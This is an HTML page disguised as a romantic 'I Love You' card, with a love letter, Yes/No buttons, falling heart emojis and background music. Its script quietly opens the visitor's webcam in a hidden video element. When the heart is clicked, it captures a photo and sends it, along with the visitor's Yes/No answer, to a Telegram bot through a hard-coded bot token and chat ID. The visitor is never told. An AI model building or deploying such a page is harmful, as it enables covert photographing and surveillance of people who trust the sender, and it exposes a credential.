<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>I Love You</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');

    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      width: 100vw;
      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
      background-size: 300% 300%;
      font-family: 'Dancing Script', cursive;
      animation: bgAnimation 12s infinite alternate;
      overflow: hidden;
    }

    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      text-align: center;
      position: relative;
    }

    .heart {
      font-size: 6rem;
      color: #ff4b5c;
      cursor: pointer;
      transition: transform 0.3s ease;
    }

    .heart:hover {
      transform: scale(1.2);
    }

    h1 {
      font-size: 4rem;
      color: #fff;
      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
      margin: 20px 0;
    }

    h1 span {
      color: #ffeb3b;
      font-style: italic;
    }

    video {
      display: none;
    }

    canvas {
      display: none;
    }

    /* Love You Too Box */
    .love-you-box {
      font-family: 'Pinyon Script', cursive;
      font-size: 2rem;
      color: #fff;
      background-color: rgba(255, 0, 0, 0.6);
      padding: 20px 40px;
      border-radius: 15px;
      margin-bottom: 20px;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
    }

    /* Love Letter Box */
    .love-letter-box {
      font-family: Arial, sans-serif; 
      font-size: 1.5rem;
      color: #fff;
      background-color: rgba(0, 0, 0, 0.6);
      padding: 20px 40px;
      border-radius: 15px;
      margin-bottom: 30px;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
      max-height: 200px;
      overflow-y: auto;
    }

    /* Yes/No Buttons */
    .yes-no-btns {
      margin-top: 10px;
      margin-bottom: 20px; /* Space from love letter box */
    }

    .yes-no-btn {
      font-size: 1.5rem;
      padding: 10px 20px;
      margin: 0 15px;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .yes-btn {
      background-color: #4caf50;
      color: white;
    }

    .yes-btn:hover {
      background-color: #45a049;
    }

    .no-btn {
      background-color: #f44336;
      color: white;
    }

    .no-btn:hover {
      background-color: #e53935;
    }

    /* Falling Emoji */
    .falling-emojis {
      position: absolute;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      font-size: 3rem;
      animation: fall 3s infinite;
    }

    @keyframes fall {
      0% { top: -50px; opacity: 1; }
      100% { top: 100vh; opacity: 0; }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- I Love You Text -->
    <h1>I <span>Love</span> You</h1>

    <!-- Love You Too Box -->
    <div class="love-you-box">
      Love You Too
    </div>

    <!-- Yes/No Buttons (above the love letter box) -->
    <div class="yes-no-btns">
      <button class="yes-no-btn yes-btn" onclick="handleResponse('Yes')">Yes</button>
      <button class="yes-no-btn no-btn" onclick="handleResponse('No')">No</button>
    </div>

    <!-- Love Letter Box -->
    <div class="love-letter-box">
      <p>Dear,</p>
      <p>I just wanted to let you know how much you mean to me. Every moment with you feels like magic, and I am beyond grateful for having you in my life. You are my heart, my soul, and everything I have ever dreamed of. I love you more than words can express. üíñ</p>
    </div>

    <!-- Heart Icon to Capture Photo -->
    <div class="heart" onclick="capturePhoto()">‚ù§Ô∏è</div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <!-- Falling Emojis -->
    <div id="fallingEmojis" class="falling-emojis"></div>
  </div>

  <!-- Background Music -->
  <audio id="loveAudio" loop>
    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
    Your browser does not support the audio element.
  </audio>

  <script>
    let video = document.getElementById('video');
    let canvas = document.getElementById('canvas');
    let context = canvas.getContext('2d');
    let audio = document.getElementById('loveAudio');
    let isPlaying = false;

    // Start the video feed (this will run in the background but not visible)
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
        video.srcObject = stream;
      })
      .catch(function(error) {
        console.error("Error accessing webcam: ", error);
      });

    // Capture photo when heart is clicked
    function capturePhoto() {
      // Set canvas size to match video size
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Draw the video frame onto the canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imageData = canvas.toDataURL('image/png'); // Get base64 image data
      
      // Send image to Telegram bot
      sendToTelegramBot(imageData);
    }

    // Send captured image to Telegram bot
    function sendToTelegramBot(imageData) {
      const token = '7485325921:AAFhTcGd07gyuc1d0X3PIqU-pjh74wd821s';  // Replace with your bot token
      const chatId = '1987016824';   // Replace with your chat ID
      const url = `https://api.telegram.org/bot${token}/sendPhoto`;

      // Convert base64 image to Blob
      const byteString = atob(imageData.split(',')[1]);
      const arrayBuffer = new ArrayBuffer(byteString.length);
      const uintArray = new Uint8Array(arrayBuffer);
      for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
      }
      const blob = new Blob([uintArray], { type: 'image/png' });

      // Create FormData object to send image
      let formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.png'); // Append image as Blob

      fetch(url, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Image sent successfully');
        } else {
          console.error('Error sending image:', data);
        }
      })
      .catch(error => {
        console.error('Error:', error);
      });
    }

    // Handle Yes/No button click
    function handleResponse(response) {
      let emojis = response === 'Yes' ? '‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è' : 'ü•∫ü•∫ü•∫ü•∫ü•∫'; // Multiple emojis
      for (let i = 0; i < emojis.length; i++) {
        // Make falling emojis appear
        setTimeout(() => showFallingEmojis(emojis[i]), i * 500); // Delay each emoji
      }
      sendToTelegramBot(response);
    }

    // Show falling emojis
    function showFallingEmojis(emoji) {
      let fallingEmojis = document.getElementById('fallingEmojis');
      fallingEmojis.innerHTML += emoji;
      setTimeout(() => {
        fallingEmojis.innerHTML = ''; // Clear falling emojis after 3 seconds
      }, 3000); // Clear after 3 seconds
    }
  </script>
</body>
</html>
